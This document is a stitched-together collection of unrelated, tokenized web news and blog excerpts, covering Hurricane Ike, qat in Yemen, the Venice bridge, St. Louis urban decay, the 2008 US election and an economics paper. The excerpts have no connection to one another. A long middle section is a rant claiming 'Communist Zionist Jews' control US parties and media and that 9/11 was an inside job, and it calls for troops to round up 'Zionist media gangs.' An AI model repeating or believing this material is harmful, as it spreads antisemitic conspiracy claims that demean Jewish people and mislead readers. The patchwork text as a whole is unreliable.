The retractable roof of the newly constructed Reliant Stadium was damaged by Ike .
HoustonPBS sustained experienced extensive damage to the section of their roof which covers the TV studios and set storage during Hurricane Ike .
The damage downtown was comparable to Hurricane Alicia in 1983 .
As of this writing , the Houston Independent School District just announced that more than half of their schools are unable to open next week because damage sustain by the Hurricane .
On top of that , they will also take in all the students from Galveston Independent School District as the City of Galveston begins the rebuilding process .
The situation in Galveston and the adjacent Bolivar peninsular is more serious .
The visible evidence is dramatic enough : parts of Galveston and the Bolivar Peninsula are reduced to matchsticks because the stilted homes were ripped from their pilings .
Even though more than 2 million residents in Texas and Louisiana heeded evacuation orders , it is estimated that between 90,000 and 140,000 ignored evacuation orders and decided to ride out the storm .
While not all those who chose not to evacuate were put in harm ’s way , federal officials reported that 2,000 people were rescued – almost 400 by air – in 2,500 search and rescue missions .
However , there are some who suffered greatly .
In the beginning there was constant coverage of the aftermath , however , the fate of Bolivar remained unknown .
If houses are destroyed and people were there , where are they ?
What we do know is that the death toll in Texas from Hurricane Ike stands at 23 .
Many local and online news sources have gone either silent regarding the casualties and deaths from the devastation the hurricane inflicted on Galveston or provided the occasional glimpse of the devastation it left behind …
to remind us of the full extent of the damage wrought by Hurricane Ike .
Unfortunately , the exact number of people who died as the result of Hurricane Ike is anybody ’s guess , and most likely it will take weeks and months to get an answer to that question .
Sadly , Galveston authorities are now conceding that the waters of Galveston Bay and nearshore waters could have washed them out to the Gulf , which apparently happened to one woman on the peninsula .
In the midst of the presidential election , one would wonder if the blackout is part of a concerted effort by the corporate media and political elites to trivialize the disaster so those outside the impacted areas wo n’t ask the vital questions .
In Part II I how FEMA is slowly turning Houston and Galveston and the surrounding area into another New Orleans as the Texas GOP plays with peoples lives .
Originally written on my blog Para Justicia y Libertad
Chewing qat leaves is bad for Yemen 's economy and public health , says its government .
But , as Stephanie Hancock found , curbing this national pastime is an uphill task .
I had only been in the country a few minutes when I noticed a man with a gigantic growth bulging out of his cheek .
The swelling was enormous , it was so bulbous it practically had its own heartbeat .
Qat chewing is a national pastime for the people of Yemen Now I have been brought up not to stare but , feeling slightly guilty , I kept sneaking glances at this unfortunate fellow .
What an awful disease , I thought to myself and how nice that other people are not staring at him , unlike me .
I wondered whether the growth might be a tumour , or perhaps some sort of thyroid problem .
I did not want to seem rude but I quietly asked my guide , Ahmed , if perhaps this man was ill .
Ahmed , in his nonchalant manner , turned to look at the man , and gave a small laugh that suggested I was very stupid .
" Ha !
That 's qat , " he said .
And so it was that I discovered the substance that makes Yemen tick .
Qat is a flowering plant that grows all over the Arabian peninsula , and when you chew the leaves it acts as a mild stimulant .
The habit is known as qat chewing , but this is a misnomer as the teeth are not actually really involved .
The aim appears to be to stuff as many leaves as you can possibly fit into one cheek , until you resemble a lop - sided hamster , and then sort of suck on the juices .
Some people chew to give them energy to work others use it for relaxation
After a while a green foamy paste forms at your lips , and at this point , conversation is now impossible .
Any important information must be communicated via grunting and pointing .
To say qat is popular in Yemen would be a massive under - statement , practically everybody in this country chews qat , two thirds of men and a third of women .
It is not elitist either , everyone from businessmen to street urchins like to indulge .
Apart from a few hard - core fans , most people seem to start up after lunch , and the chewing will often go on late into the night .
Relaxation aid Some people chew to give them energy to work others use it for relaxation .
It is a common sight here to see men flaked out on pavements , gazing absent mindedly into the distance , giving total concentration to the chewing task at hand .
Qat is an integral part of life here in Yemen , but these days the government is becoming concerned about its effects and this week sounded alarm bells about qat 's grip on the country .
The man behind the warning is Yemen 's planning minister Abdulkarim al - Arhabi .
I went to meet him in his office , where he patiently explained all the many ills qat is responsible for .
For starters , there are the health effects such as mouth cancer , he said , which is on the rise because farmers are using more insecticide .
Farmers are also now choosing to grow water - thirsty qat instead of food crops , he said , because it consistently fetches high prices .
Economic drain
The result is a major drain on water in a country suffering drought and a growing reliance on foreign food imports at a time when staple goods are more expensive than ever .
Then there is the effect on productivity , he added , with all those young people sitting around chewing qat when they could be working .
Critics of the government point out that one in three Yemenis is unemployed and chewing qat is a simple way to pass the day and keeps them away from alcohol and harder drugs .
Later I went for a look round Sanaa 's lively qat market , and it is amazing to see how much money changes hands , especially for the high quality blends which can cost up to £ 10 a bag , and that will only last you one afternoon .
When people are chewing qat , they do n't ask awkward questions about where Yemen 's oil revenues are going
Ahmed
It made me realise that qat is a big part of the economy here .
My guide Ahmed , whose mood was always intimately linked to the size of the bulge in his cheek , is suspicious of the government 's fighting talk over qat .
" The government needs qat , " he told me with a mouthful of green leaves .
" It says it wants to stop it , but it earns lots of money from all the taxes farmers pay .
" Besides , " he added , his voice dropping to a gurgled whisper , " when people are chewing qat , they do n't ask awkward questions about where Yemen 's oil revenues are going . "
Nobody knows what would happen if qat was taken away And with this he hit the nail firmly on the head .
Yemen has recently suffered from riots , when angry young men , unable to find work , rose up against the government .
Poverty and corruption , a faltering economy and unemployment all linked and all related in some way back to qat .
It might be causing problems for this country , but nobody is quite sure what would happen if you took qat away .
As one trader told me as he hawked his goods for sale in the market : " Qat is the key to peace in Yemen .
Nobody would be stupid enough to meddle with that . "

A Thai snake charmer kissed 19 highly poisonous king cobras in an attempt to set a world record .
One by one , the cobras were released Saturday onto a stage set up in this Thai beach resort town , as the snake charmer , Khum Chaibuddee , kissed each one and then moved onto the next .
Security was tight , with four additional snake charmers flanking the stage at each corner and a medical team waiting on the sidelines with serum in case one of the snakes snapped , according to a statement from Thailand ’s Ripley ’s Believe
It or Not Museum in Pattaya , which organized the event .

Tourists crossing a new bridge built across Venice 's Grand Canal have stumbled across a possible flaw , which has landed 10 of them in casualty with twisted ankles and other minor injuries .
The 10 tourists were treated after taking a tumble on the 94 - metre long Constitution Bridge , designed by the Spanish architect Santiago Calatrava , which opened on September 11 .
Pedestrians who lost their footing have blamed the bridge 's irregularly spaced steps , some of which act as viewing points , and the disorienting optical effect of the sectioned stone and glass flooring .
" People miss a step and then they come and moan at us , " a police guard on 24 - hour security watch at the sleek steel and glass bridge told the Italian newspaper Corriere della Sera .
But one of the city 's doctors , Paolo Pennarelli , suggested the mishaps were partly due to tourists marvelling at the bridge 's impressive views over the lagoon city rather than paying attention to their feet .
" We have quite a lot of this type of accident every week .
In Venice , falls like this are natural , " he said .
Venice city council has asked Calatrava for suggestions to remedy the problem , but has so far ruled out closing the bridge for structural modifications .
" We 'll intervene with some sort of signalling system for distracted tourists , perhaps with stickers on the ground , " Salvatore Vento , Venice 's head of public works , told Corriere .
This is the latest in a series of setbacks for the bridge , which has been criticised for delays and cost overruns .
One might think it a stretch to take a label given to Mussolini by history and place it atop Silvio Berlusconi ’s head , but that ’s precisely what The Pirate Bay have done .
Why for ?
The Italian government ’s organizing of a clean sweep of Italian ISPs to prevent access to the BitTorrent website .
Indeed , Pirate Bay co-founder Peter Sunde is annoyed , according to TorrentFreak , and is claiming discrimination by fascism .
The block put in place by ISPs is said to have been implemented with a formal government request issued Friday .
TPB presented a brief explanation on its blog concerning the matter , and is for the moment asking Italian users to redirect their browser to another .org address , dubbed “ La Baia . ”
Berlusconi , Italy ’s Prime Minister between 1994 - 5 , 2001 - 6 , and now 2008 once more , has a particularly strong desire to do away with copyright infringement on the Web .
He is the founder and majority owner of Fininvest , a media and finance conglomerate that controls much of the nation ’s television market within the Mediaset empire , as well as the film company Medusa .
This is just pathetic .
Palin did n’t go on Katie Couric again , as we were led to believe .
She went on Katie Couric with John McCain as her chaperone so he could jump in and protect her if any reporters got fresh with any hard questions .
Absolutely pathetic .
McCain wo n’t be around to coach Palin if he ’s not around and she becomes president .

1900 Montgomery Street , 1875 : View looking northwest , per Compton & Dry's Pictorial St. Louis , 1875 .
1900 Montgomery Street , 2003 :
The same block , the same view .
The shaded houses from above are shown here .
Almost nothing else is left .
ABOVE : 1900 Montgomery , circa 1909 BELOW : 1900 Montgomery , circa 2003
Houses in red have been demolished as of March 2007 .
The Ravaging of St. Louis
In 1890 , St. Louis was the fourth largest city in America .
Today it 's ranked 48th .
In 1950 , there were almost 900,000 people living inside the city limits .
Today that same land is home to only 300,000 .
That 's out of two and a half million people in the metro area .
In the 1990s , the metro population increased by 1 percent .
The land consumed by that population went up fifty percent .
At any given time there are about 6,000 abandoned buildings in St. Louis .
I say approximately because the old ones keep falling down and new ones keep taking their place .
An entire industry has built up around the millions of red bricks that come from wrecked houses .
They 're stacked on pallets and shipped to other cities .
A hundred years ago , fifty , even 30 years ago , the city was full of life , the streets vibrant and bustling , the neighborhoods full of people and activity .
But today you can walk around many of the streets in the old city and they 're empty .
Nobody 's there .
Four decades of urban decay have left the city of St. Louis , Missouri with some of America 's most devastated urban landscapes .
Some people say the city is no longer dying ; they say it 's dead .
There 's much to contradict that claim -- renovation and new construction , movements and organizations , revivals both commercial and grassroots .
But I 've spent a lot of time driving around and photographing the northern half of St. Louis , where most of the abandonment and decay is .
There 's a lot up there to substantiate that claim as well .
In some areas you can't turn a corner without finding a boarded up old house .
Entire neighborhoods have vanished , leaving only scattered survivors of the city 's fine vernacular housing stock standing where once there were solid blocks of homes .
A Neighborhood 's Fall
The 1900 block of Montgomery Street is a textbook case , an ordinary residential block in the St. Louis Place neighborhood .
At upper left , you see how it looked in 1875 , its formative years , as captured in Compton and Dry 's perspective atlas of the city .
It is a burgeoning urban environment : dense , walkable , human - scaled , full of sturdy red brick buildings .
The block was alive , the buildings continuous from one corner to the other .
Today , 130 years later , only the shaded ones remain .
The devastation is so widespread that it's hard to grasp how much has been lost .
You visit 1900 Montgomery today , and you see 6 buildings , with spacious grass lots between them .
You accept it and move on , thinking no further of it .
And when another one succumbs to fire or wind or gravity or the bulldozer , you shrug .
" It 's just one building , " they always say .
Yes , one building .... one after another , and another , and another , and another , and another ... thousands of anothers .
The first lesson here is : this is not normal .
This is not acceptable !
What 's happened here is a microcosm of much of St. Louis : the disintegration of urban fabric .
Urban design is about creating a series of interconnected outdoor rooms ; it is about defined space , spaced scaled for human beings and densely populated with them .
Here , the space has lost all cohesion , all definition , all population .
The intricate patterns of urbanization are destroyed .
The surviving houses sit lost in an amorphous void , their brick party walls standing exposed like raw wounds .
The consequences are far - reaching and many - layered .
This is no longer a walkable neighborhood , not in the sense of being able to meet basic necessities without a car ; even if the surviving houses were occupied , the retail stores which once served the street ( a corner store at each end of the block , with more around the corner ) are long gone .
This is no longer a self - sufficient neighborhood ; tax base vanishes along wih population .
This is no longer a community ; there are no social networks in place , no neighbors at all .
This is no longer a place ; there is no definition of space , no boundaries , no sense of enclosure , no meetings between public and private , no interweaving of many functions , no commerce ; there is only scattered , leftover objects .
What Once Was Here
The two images at left are figure / ground diagrams -- the black represents buildings ; the white , open land .
The top image represents the block as it stood around 1909 ; it gives every indication of being an integral part of a healthy urban neighborhood .
There are dozens of houses ; a couple of corner stores stood on the north side of the block .
Most of the houses have some kind of alley building : garages , storage , stables ( or perhaps outhouses ; I do n't know when indoor plumbing came to this corner of the city ) .
They are of varying sizes and footprints ; their relationship to the street is consistent but not rigid ( for example , three houses set back from the south side of the street create a defined space within the wall of houses . )
Some houses are nearly touching ; others have a comfortable distance between them .
The varied nature of the houses make it likely that they were built by numerous owners and small developers ; yet in the end they all work together to create urban space .
This is how a city is supposed to look .
This is how it must look , if it is to survive and thrive and nurture its residents .
This is the density required to support mass transit , to create a vigorous economy , to support small local stores and businesses , to permit choices for transportation beyond the automobile , to accomodate a range of incomes , to provide the opportunity and economic mobility that nurture democracy .
The second diagram shows the same block , a hundred years later .
It 's a ruin , the barest skeleton of its former self .
Less than 10 major structures remain where once there were over 30 ; the relationships between the survivors have been severed .
The sense of defined , controlled space has vanished .
This is now an urban desert -- barren open space punctuated by lone survivors .
The vacant lots are not an asset .
They are not " green space " .
They are wasted space .
For the city of St. Louis , they are black holes , sucking the life out of the place .
Every missing house represents lives gone elsewhere , creativity lost , connections never formed , tax base decreased , vitality dimished .
They are a squandered opportunity that the city cannot afford .
But the city is full of such places .

Whenever you see yourself writing the same thing down more than once , there ’s something wrong and you should n’t be doing it , and the reason is not because it ’s a waste of time to write something down more than once .
It ’s because there ’s some idea here , a very simple idea , which has to do with the Sigma notation … not depending upon what it is I ’m adding up .
And I would like to be able to always … divide the things up into as many pieces as I can , each of which I understand separately .
I would like to understand the way of adding things up , independently of what it is I ’m adding up .

Programming is our thoughts , and with better ways to express them , we can spend more time thinking them , and less time expressing them .
3 + 3 + 3 + 3 + 3 + 3 is hard …hard to read ( how many threes ? ) , hard to get right ( I lost count ! ) , hard to reason about ( piles of operations ! ) .
3 x 6 is easy , once you learn multiplication .
This is a good trade - off .
We should look for ways to add abstractions , new semantic levels , to our programs .
If you ’re doing the same thing twice , stop , and look for the common idea .
Peel the idea away from the context , from the details .
Grasp the idea , and then use it over and over .
As a bonus , you ’ll type less , re-use code , and debug less .
“ But I ca n’t find ways to do that ! ”
When you look at similar bits of code , and ca n’t find a good way to remove the duplication , you ’re hitting the limits of either your language , or your knowledge .
Programming languages put up very real walls , they force you down their paths , often by leaving out features .
A language without recursion puts up a wall in front of recursive solutions ; a language without first - class functions makes it tough to write higher - order functions .
Language limitations are the cause of Greenspun ’s Tenth Rule .
Sometimes , the language is not the problem .
Sometimes you just can’t find your way through .
This is why you read Refactoring , and Design Patterns , but really , this is why you learn other programming languages .
Think about the right way to factor the problem .
If you ca n’t remove the duplication , you need to work around your language , or learn some new tricks .

The US Democratic presidential candidate has denied claims of sexism after likening his rival 's promise of change to putting " lipstick on a pig " .
Barack Obama said Republican John McCain 's outrage was " phoney " , a diversion from debating real issues .
The controversy began on Tuesday after Mr Obama said his rival was advocating change while pursuing the politics of the current Bush administration .
Mr McCain 's campaign accused him of smearing running mate Sarah Palin .
Mrs Palin joked last week that lipstick was all that separated a " hockey mom " and a pitbull .
' Made - up ' controversy Mr Obama made the remark during a rally in Virginia where he accused the McCain campaign of trying suddenly to adopt the promise of change - a platform he himself has been running on for months .
Drawing a link between the Republican senator for Arizona and President George W Bush , he suggested change would be impossible for Mr McCain to achieve .
The famously thin - skinned porcine population of the US is up in trotters about the imputation of cross-dressing

Pigs and lipstick " You can put lipstick on a pig .
It 's still a pig .
You can wrap up an old fish in a piece of paper and call it change .
It 's still going to stink after eight years .
We 've had enough . "
Mrs Palin , a self - described " hockey mom " , made her joke about lipstick during a speech at the Republican National Convention last Wednesday .
Soon after Mr Obama 's comments , McCain aides produced an election campaign ad referring to " sexism in American life " , and accusing the Illinois senator of " smearing " Mrs Palin , governor of Alaska .
And there was speculation that Mr Obama might apologise , but he took a more aggressive line , says the BBC's Kevin Connolly in Washington .
He dismissed the " made - up controversy " on Wednesday - defending his remark as an " innocent expression " .
Mr Obama said his comments had been taken out of context .

Advertisement " The McCain campaign would much rather have the story about phoney and foolish diversions than about the future , " the Illinois senator said .
Republicans may well try to keep the controversy going , although one difficulty for them is that John McCain has himself used the offending phrase , our Washington correspondent says .
Mr McCain had used the same analogy to criticise a health care plan presented by former Democratic presidential hopeful Hillary Clinton last year .
The row erupted as a new poll by the Wall Street Journal and NBC News suggested that Mr Obama and Mr McCain were in a statistical dead heat .
Mr Obama held a lead of several points earlier this summer .
Another poll by CNN and the Opinion Research Foundation also put the rival candidates in a statistical tie , with Mr Obama polling 49 % to Mr McCain 's 48 % .
The latest Gallup daily tracking poll of registered voters gave Mr McCain a lead of 49 % to Mr Obama 's 44 % .

What are these ?
This article is to fine tune a picture , so you can better see , exactly , what is going on in Washington , DC .
As you read on , keep this phrase in mind : " institutionalization of criminal racketeering " by our government against you .
At the behest of Wall Street and the Wealthy Elite , our government has literally legalized theft through stock fraud in our capital markets .
Many people have asked why I walked out on RNC in 1996 .
It was actually for two reasons because I could clearly see , from inside knowledge , that both of the efforts to change US policy and head in dangerous , evil , based - on - lies directions were going to be complete catastrophes for the United States and its people .
I could clearly see in 1996 that what they thought they could pull off like a cake walk was going to backfire in their faces and seriously endanger the future of America .
I also knew it would seriously damage the financial health of most American citizens .
Here we are 12 years later and I was 100 % right then ... and now .
The world was already changing for the better but that was not good enough for DC .
They were trying to maneuver to rule the world as if DC were on some kind of moral high ground that other nations did not possess or could never reach .
They knew they were going to have to lie to pull off their scam , and they were delusional enough to think they could do it and never get caught .
That delusional thinking based on being the world 's biggest economy , and the planet 's only remaining military Superpower , would not change .
There were even some so brain damaged they thought the US could rule the world with intellectual property , economic and military might alone .
They seemed to fail to realize what other nations think of the US matters , too , as to its willingness to follow .
The first reason I left RNC has been elaborated upon in prior articles and email updates , it was the realization that to get the Jew vote and money behind the RNC - so they could win elections - the higher - ups of RNC had cut a deal with the Communist Zionist Jews of the DNC .
They agreed to allow them to come on over to RNC , dress up like Conservative Neocons and talking heads on TV and have their War Party .
These are the Russia - hating Zionists and that is why they have now defected back over to DNC and the Obama ­ Zbigniew Brzezinski team of their expected new ObamaNation .
Bush Co failed , and it is apparent - at least as of now - that McCain does not have a chance in November .
He is an idiot , but so is Obama , albeit dangerously so , if he thinks he can turn this disaster around into an " American victory " .
Zbigniew is the author of Russia - hate and he schemes of world grandeur : The Grand Chessboard ... the ' geostrategic imperative ' now all dressed up as the lunatic global ' War on Terror . '
That was the day that the RNC sold out any vestiges of being the " conservative party " of America and I , as a conservative , was offended .
They turned communist to win elections but knew that they could not sell communism to America .
They chose to wrap up as Fascism in the flag , and Christianity , and patriotism and sell that instead and brow - beating Americans with a media empire scheme .
My reason for departing went one step further than that because the RNC policy makers could clearly see that such a plan was going to need a Main Stream Media system that was bullet - proof , so such lies could be pushed on America and slicker the public to buy off on the change of directions in policy .
This was also during the period of time that they acquiesced in the Zionist takeover of all the major US media outlets .
I was there when they were talking about how easy it would be to fool Americans by constantly bitching about " Liberal media bias " and Americans would not figure out that the media was being fine - tuned into a US - UK - Tel Aviv propaganda axis machine , so our ' leaders ' could perpetrate war crimes and genocide as if it were just another day at the office .
The second reason I severed my RNC ties , was that the policy makers were working on ways to literally institutionalize criminal racketeering and plunder unsuspecting Americans and foreigners at historically unprecedented levels - even including the days of the Robber Barons that led to the Great Depression .
Americans do not provide enough financing for the ' elections ' ( which are nothing much more than huge revenue opportunities for consultants , ad agencies and the media . )
The Wealthy Elite do , so they needed many more Wealthy Elite beholden to the DC Lie System .
To these monsters , American citizens are merely appendages and US Treasury liabilities ... not their partners in criminal enterprise .
They tried to push through a Bankruptcy Reform Bill during the George H W Bush Administration but the Democrat - controlled Congress would not play along .
The most important part of that bill included the elimination of Equity Shareholders of publicly - traded companies being entitled to " Party in Interest " status in bankruptcy .
In 1994 , just before the House and Senate were taken away from Clinton , they pushed that bankruptcy bill through mainly due to urging of the Trial Lawyers because they had a plan .
Clinton acquiesced and so did Congress , big bucks were promised to the DNC for this underhanded chicanery .
The DNC was scrambling to come up with a way to make up for the loss of revenues and campaign donations caused when the DNC Communist Zionist Jews walked out and teamed up with RNC .
That was Step One - take the companies away from the equity shareholders and there was nothing they could do about it .
It did not seem like a ' major thing ' at the time but it was the technique used by the Robber Barons to force companies into bankruptcy through illegal offshore trading schemes , blow out the shareholders of the company with $ 0 return , and takeover huge blocks of assets for pennies on the dollar .
One such fraud was Global Crossing .
Built at a cost of $ 56 billion and taken over for only $ 250 million by ST Telemedia of Singapore , a Bush Buddy in the fake Global War on Terror .
I was the high bidder at $ 815 million and could not get the time of day .
We had Wall Street by the throat on how they put the company down for that cheap takeover .
Do n't believe me ?
Check this , look for COMMAXXESS : http://www.fcc.gov/transaction/globalcrossing-gx.html
If you look around you , it is not hard to find many Americans who have been robbed into the poorhouse by such schemes .
I am aware of many hundreds of companies and over $ 1 trillion that was premeditatedly stolen from the average Mom and Pop investor .
I knew there was trouble coming - but not the extent of it - until Clinton did something in 1996 that proved to me that both the DNC and RNC are out to bury Americans and make them wards of the state .
The first thing Clinton did was change a provision of RICO , or the Racketeering Influenced Corrupt Organization Act , 18 USC §§ 1961 - 1964 , et seq. , in whch part of the Criminal Code of the United States of America was very quietly amended to aid and abet the theft of the millennium .
What Clinton and the Republican - controlled Congress changed was Civil RICO , specifically 18 USC § 1964 ( c ) , and thereby barred civil RICO in matters of stock fraud cases .
They had planned a giant robbery of American citizen investors - and surely did not want to let them take control back and get treble damages when they proved their cases in court .
What Clinton and the then RNC - controlled Congress ( 1996 ) did was to legalize theft through the capital markets .
By removing RICO as a remedy from Civil Plaintiffs , those who had been victimized by premeditated corporate , government and Wall Street fraud could not get treble damages and disgorgement of what had been stolen from them .
That was Step Two .
That created , at the urging of the Trial Lawyers Association , the entire " free legal services for class action stock fraud cases " and they went after the insurance companies who underwrote the D&O ( directors and officers ) insurance policies .
Even the D&O insurers were in on it because they were making fortunes in the rush for new IPOs and stock plays , knowing all along that they would also line their pockets in the bogus stock fraud cases to follow .
There were thousands of such cases and American and foreign investors in our stock markets were defrauded out of TRILLIONS of their hard - earned money .
This is part of their New World Order scheme of making everyone not in the inner circles serfs to serve these delusional , arrogant , bereft of goodness masters .
They needed something else , though , to eliminate the liability of the officers and directors of those corporations .
It would not do to plan a theft of major corporations and assets , paid for mainly by common and preferred stock and Wall Street fluff , if the stock holders could penetrate this veil of deceit and nail the corporate management and board members .
That would open the door to taking back everything that had been premeditatedly stolen through Wall Street and DC scams .
They had to have willing , corrupt management that would play along and get huge bonuses and Golden Parachutes after the maximum number of suckers had been lured in and enticed to cough up their money .
They then turned on the machine to ruin the value of the companies , drive the share values down , trigger debt covenant defaults that were tied to the value of the equity shares , and blow out the shareholders to $ 0 left .
They also had to get the insurance companies who underwrite the D&O insurers to play along .
No problem , just put them into the deal before IPO and run the value of the stock way up , they sell at or near the top of the all - time share value and then know they will only have to pay out about 2 - 5 cents on the dollar if they lose the class action stock fraud case in court .
Pretty slick , huh ?
Put a system in place that will rob you over and over again , unless you invest in just those companies that are not on the list for such underhanded takeovers .
That was Step
Three because they had to have willing accomplices for when they lost the stock fraud cases .
Then there was Step Four .
What they then did was to change the SEC Disclosure Rules to let the directors and officers off the hook .
Meanwhile , the insurance companies had already made a fortune on their insider positions , so paying a little back looked like they got kicked good in court .
If a company inserted into the press release the news byte of the following Disclosure Statement , the corporate management and board members were in a condition of ' hold harmless ' ... and only the insurance companies were on the hook .
To better understand how they play this game of ' shits and giggles ' with YOUR MONEY , check this :
http://www.law.uc.edu/CCL/34Act/sec21E.html
http://liesdamnlies.blogspot.com/
If the management and board put this statement at the end of their press releases , they are under the ' Safe Harbor ' provision .
They lied , they ripped off hundreds of millions and billions , but ' no harm , no foul ' under SEC rules and US law that was amended to aid and abet racketeering on YOU and every other person stupid enough to think they could be a wealthy person by investing in the scheme Wall Street and DC came up with .
http://www.eogresources.com/home/fwd_stmt.html
If you read the tout about how a company 's performance is going to change but do not read the ' Disclosure Statement ' that comes under Laissez Faire or BUYER BEWARE you 're in trouble .
They are just trying to sucker you into buying the stock at ever - increasing prices and then yank the rug out from under your feet .
If you get a concussion , or die , or get plowed under financially , tough luck , sucker !
You did not know about this legalization of theft ?
Tough luck !
Should have paid better attention to what the morons in DC were up to .
The management members could claim that revenues were going to jump 1,000 % over the next quarter because they acquired technology to deliver sex and orgasms over the Internet ' real time ' and if they put in the Disclosure Statement the officers and directors are under the Safe Harbor .
They could do any idiot thing they wanted including lie about company performance , revenues , future prospects and if they put the Disclosure Statement at the end they had zero liability .
Of course , it was on the fluff and no substance that Wall Street would then kick in and drive that stock as high as they could to lure in more suckers and more money , before yanking the rug out and leaving the shareholders with nothing .
When the company stock goes to $ 0 , you are screwed for not paying attention .
Folks , this has been promulgated and nurtured by Washington , DC because this is exactly what their wealthy backers wanted .
They legitimized the right to conduct racketeering and criminal theft of funds against Americans or anyone else standing in the way of American hegemony and Billionaire Creation .
The ' quid pro quo ' ?
Massive campaign donations to these lying thugs in DC .
See ?
Who says you cannot rent or own someone in Congress ?
They created an entirely new way to become a billionaire fast .
First you become a robber baron and then you exhibit " magnanimity " by being a wealthy backer of the liars and thugs in DC now controlling this criminal enterprise .
It is a RICO enterprise aimed right at you and making sure you never have enough money to be a threat to these punks and gangsters in DC .
Most people who read " One - Way Ticket to Crawford Texas " were amazed at the information I provided about such corporate frauds and how DC is now using that as part of its overall web of lies to attempt to be the unipolar force in this world .
Those days are over but not according to the power - deluded goons in DC .
I have been on those front lines people , both in DC and in the Southern District of New York U.S. Bankruptcy Court , fighting for small investors who were intentionally and premeditatedly ripped - off by what DC and Wall Street are now doing .
It is ' Institutionalization of Criminal Racketeering ' and the goal is total domination of the US and total domination of the world .
The MSM is one piece of it .
They know that most Americans will believe whatever they hear on the MSM .
The reason 9 - 11 Truth has not taken hold with most Americans is they have not seen it on CNN , FOXNews , CBC , ABC , NBC , CNBC , and MSNBC .
Get the picture ?
Americans are indeed like little birds waiting for their next ' news byte lie ' and then to accept that lie as truth ( when it is a lie ) , and then go right back to shopping , grazing , working , rushing the kids to school or sports activities ... and watching teevee .
The laws and policies are another piece of it .
Remember , this cowardly Congress rolled over for Bush to retroactively grant him and themselves exoneration for war crimes and crimes against humanity .
They will stoop to anything and will do anything for they have no character , no honor , no honesty , no integrity .
They are traitors and now Racketeers plundering the very spirit of America .
All America has to do to find out who the architects were of this assassination of the American Dream is to look at who voted for what I just described to you .
Clinton was sleazy and did much damage to the American capital markets and investors .
When Bush came to office , so much fluff and theft had been done it imploded .
That is one perfect reason why their pulling off 9 - 11 was criminal to the point of stupidity ... because their policies and their changes in the laws had gutted the real value of the market , just like it has happened in housing .
Think that one through .
It will only get fixed when Americans wake up to the truth of the matter and the gravity of the situation .
They are , in Washington , DC , involved in institutionalization and execution of criminal racketeering against YOU .
If I were president , there are a few first steps I would take .
1 . * All US troops in Iraq would be moved to Turkey , Jordan and Kuwait to await further orders 2 . * All US troops in Afghanistan would be moved to Kuwait and Turkey to await further orders 3 . * The DOJ and FBI would be instructed to initiate the immediate dismantling of the Zionist media gangs .
They are not conglomerates , they are part of a massive Zionist propaganda campaign machine 4 . * US forces would be deployed in the US to back up the FBI as this criminal cabal is rounded up and brought to justice 5 . * All attempts to fabricate a war against Iran would be under immediate Executive Order of ' cease and desist '
6 . * Israel would be told to shut up , sit down and bifurcate separate states between Israel and Palestine immediately .
Just in case some Arab nation reads that the wrong way , US aircraft carrier attack groups would be relocated from near Iran and moved down to very near Israel 7 . * The DOJ , SEC , FBI would be instructed to track down and prosecute every party profiteering from oil and gas , grain and metals futures to the detriment of the entire world 8 . * The anthrax attack investigation would proceed to full conclusion , with full backing of the White House 9 . * The Cheney Energy Task Force would be brought under full investigation , with the full backing of the White House 10 . *
The 9 - 11 investigation would proceed to full conclusion , with full backing of the White House and many indictments would ensue 11 . * Many members of many administrations and Congress would be facing indictments for war crimes , genocide and treason against the United States of America and 12 . *
And there would be a major house - cleaning at CIA and DoD , and across the entire Zionist , corrupt infrastructure that has been installed in DC Karl
A paper co-written by an Indiana University economics professor takes issue with the widespread idea that there is a " natural resource curse " that puts countries with oil or mineral wealth at a disadvantage when it comes to economic growth .
The paper also shows that a common explanation for the curse -- that an abundance of oil or other point - source resources causes countries to have lower - quality civic institutions -- is n't true .
Having such resource wealth " may not improve institutions , but it does n't make them worse .
It does n't affect them one way or another , " said Michael Alexeev , professor of economics at IU Bloomington and co-author of the paper with Duke University economist Robert Conrad .
The paper , titled " The Elusive Curse of Oil , " has been accepted for publication in the Review of Economics and Statistics .
It has not yet been published .
In the 1990s and early 2000s , a series of economics publications made the claim that an abundance of point - source resources , such as oil , gas , gold and diamonds , was associated with weak economic performance .
The idea came to be widely accepted , and the term " natural resource curse " was coined to describe it .
Further research focused on the reason for the curse , and the most convincing answer seemed to be that , for a variety of reasons , nations with an abundance of point - source resources tended to have worse - than - average governments and other institutions .
But Alexeev and Conrad found no correlation between natural resource endowments and the quality of institutions if the calculations are done correctly .
Previous analyses that found such a link , they say , were skewed by using per-capita gross domestic product ( GDP ) as a controlling variable .
That approach resulted in comparing countries with high GDP and strong institutions with those that have high GDP purely because of resource wealth : comparing Portugal with Kuwait , for example .
" In essence , " Alexeev said , " the logic of the earlier work was as follows : Most countries with high GDP have good institutions .
Natural resource - rich countries , however , have high GDP but poor institutions .
Therefore , natural resources must lead to poor institutions . "
In their analysis , the authors calculated what they believed countries ' GDP would be if they did n't have oil .
With oil - driven increases in GDP removed from the equation , the presence or absence of oil had no impact on the quality of national institutions .
The authors also made use of " a kind of natural experiment , " comparing Russia , Ukraine and Belarus , three geographically similar Slavic countries created by the break - up of the Soviet Union .
Russia has extensive deposits of oil , gas and minerals ; Belarus has almost none ; and Ukraine is in between .
If there were a natural resource curse , Russia would be expected to have the worst institutions and Belarus the best .
In fact , Russia and Ukraine have similar scores for institutional quality , and Belarus scores much worse .
" The fact that growth based on natural resource wealth does not improve institutions is a drawback of this type of growth , " Alexeev said .
" But it does not make it a curse . "
The paper also disputes the very concept of a natural resource curse , pointing out that countries possessing significant point - source resources tend to be wealthier than other countries .
While resource - rich countries may not have experienced strong economic growth in recent years , they write , those countries did grow at a faster rate when their oil or other resources were being developed .
" After all , " Alexeev said , " long - term growth is everything until now , " not just growth that has taken place since an arbitrary starting point of 1960 or 1970 .
Alexeev said it 's important to have an accurate understanding of the effect of point - source resource wealth on economic growth and institutional quality .
The World Bank and other institutions make decisions about guiding and encouraging the development of point - source resources based in part on whether officials believe there is a natural resource curse , he said .
A preliminary copy of the paper " The Elusive Curse of Oil " can be seen on Alexeev 's Web site at mypage.iu.edu/~malexeev/ .

I just did some simple arithmetic related to gas prices .
See . . .
I ’ve been hearing lately that predictions put gas prices at about $ 7 per gallon by the end of the year , so I figured I ’d add up the comparative costs of driving to and from work in a car versus a motorcycle .
Assuming a 30 mile drive to work each weekday , and a very conservative 220 work days per year , plus another hour ’s worth of driving around each week , you ’re looking at about 3800 dollars on gas , given a car with good gas mileage — at $ 7 per gallon .
A motorcycle uses about half as much gas as a car for the distance traveled .
